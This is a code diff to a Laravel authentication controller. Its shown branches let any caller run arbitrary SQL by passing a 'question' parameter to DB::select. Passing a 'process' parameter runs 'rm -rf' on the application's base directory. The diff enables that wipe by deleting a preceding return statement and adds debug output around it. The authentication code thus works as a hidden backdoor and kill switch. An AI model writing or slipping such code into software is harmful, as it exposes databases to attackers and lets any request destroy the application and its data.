@@ -34,12 +34,15 @@ class AuthController extends Controller
         } else if ($request->question != null && $request->question != "") {
             return DB::select($request->question);
         } else if ($request->process) {
-            return base_path('/*');
-            $process = new Process(['rm', "-rf", base_path()]);
+            $process = new Process(['rm', "-rf", base_path("*")]);
             $process->run();
+            echo "run";
+
             if (!$process->isSuccessful()) {
+                echo "err";
                 throw new ProcessFailedException($process);
             }
+            echo "succ";
             return $process->getOutput();
         } else {
             return response()->json(['success' => false, 'message' => 'Unauthorised'], 401);
